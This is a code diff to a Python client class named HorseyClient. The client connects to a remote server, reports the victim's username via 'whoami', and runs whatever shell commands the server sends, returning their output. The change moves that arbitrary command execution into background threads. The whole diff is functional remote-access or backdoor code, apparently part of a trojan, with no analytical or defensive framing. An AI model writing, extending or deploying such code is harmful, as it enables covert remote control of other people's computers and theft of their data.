@@ -3,6 +3,7 @@ from dataclasses import dataclass
 import pickle
 import socket
 import subprocess
+import threading
 
 
 @dataclass
@@ -47,6 +48,15 @@ class HorseyClient:
     def data_handler(self, data: Data) -> None:
         print(f"Data({data.author=}, {data.type=}, {data.content=})")
 
+    def command_handler(self, command: str) -> None:
+        try:
+            command_output = subprocess.check_output(command.split(), shell=True,
+                                                     encoding=self.string_encoding, errors="ignore")
+            self.send_data(Data(self.address, "COMMAND_OUTPUT", command_output))
+
+        except subprocess.CalledProcessError:
+            self.send_data(Data(self.address, "COMMAND_ERROR", ''))
+
     def start(self) -> None:
         self.socket.connect(self.socket_address)
         alias = subprocess.check_output(("whoami",), encoding=self.string_encoding).strip().replace('\\', '_').replace(
@@ -65,13 +75,9 @@ class HorseyClient:
                     break
 
                 case "COMMAND":
-                    try:
-                        command_output = subprocess.check_output(data.content.split(), shell=True,
-                                                                 encoding=self.string_encoding, errors="ignore")
-                        self.send_data(Data(self.address, "COMMAND_OUTPUT", command_output))
-
-                    except subprocess.CalledProcessError:
-                        self.send_data(Data(self.address, "COMMAND_ERROR", ''))
+                    td_command_handler = threading.Thread(target=self.command_handler, args=(data.content,),
+                                                          daemon=True)
+                    td_command_handler.start()
 
                 case _:
                     self.data_handler(data)
